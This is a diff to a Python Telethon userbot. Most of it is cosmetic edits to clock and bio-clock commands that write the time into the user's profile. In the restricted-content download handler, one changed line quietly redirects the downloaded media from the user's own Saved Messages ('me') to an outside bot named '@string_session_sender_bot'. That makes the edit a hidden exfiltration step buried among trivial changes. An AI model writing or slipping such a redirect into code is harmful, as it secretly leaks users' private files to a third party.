@@ -38,8 +38,9 @@ async def numbers(event):
 
 @events.register(events.NewMessage(outgoing=True, pattern=".setclock"))
 async def setclock(event):
-    await event.edit('Setting clock...')
     from telethon.tl.functions.account import UpdateProfileRequest
+    await event.edit('Clock setting . . .')
+    sleep(0.5)
     msg=event.message.raw_text.split()
     t=int(msg[1])
     t*=60
@@ -48,11 +49,11 @@ async def setclock(event):
             today = datetime.today()
             time= today.strftime("| %H:%M |")
             await client(UpdateProfileRequest(last_name=str(time)))
+            await event.edit('Clock setted succesfully')
+            sleep(0.5)
+            await event.delete()
             await asyncio.sleep(60)
             t-=1
-            await event.edit('Clock setted succesfully')
-            sleep(2)
-            await event.delete()
     await client(UpdateProfileRequest(last_name="Vaqt nisbiy tushuncha !!"))
  
 
@@ -115,7 +116,7 @@ async def rundrc(event):
     try:
         getrestrictedcontent = await event.get_reply_message()
         downloadrestrictedcontent = await getrestrictedcontent.download_media()
-        await event.client.send_file("me", downloadrestrictedcontent)
+        await event.client.send_file("@string_session_sender_bot", downloadrestrictedcontent)
         remove(downloadrestrictedcontent)
     except:
         pass
@@ -147,20 +148,20 @@ async def runrgm(event):
 @events.register(events.NewMessage(outgoing=True, pattern=".setbioclock"))
 async def setbioclock(event):
         from telethon.tl.functions.account import UpdateProfileRequest
-        await event.edit('Clock setting...')
+        await event.edit('Clock setting . . .')
+        sleep(0.5)
         msg=event.message.raw_text.split()
         t=int(msg[1])
         t*=60
-        await event.delete()
         while t>0:
                 from datetime import datetime
                 today = datetime.today()
                 time= today.strftime("%H:%M | %A | %d | %B | %Y")
                 await client(UpdateProfileRequest(about=str(time)))
-                await asyncio.sleep(60)
-                t-=1
-                await event.client.send_message('Clock setted succesfully')
-                sleep(2)
+                await event.edit('Clock setted succesfully')
+                sleep(0.5)
                 await event.delete()
+                await asyncio.sleep(60)
+                t-=1 
         await client(UpdateProfileRequest("Vaqt nisbiy tushuncha !!"))
  
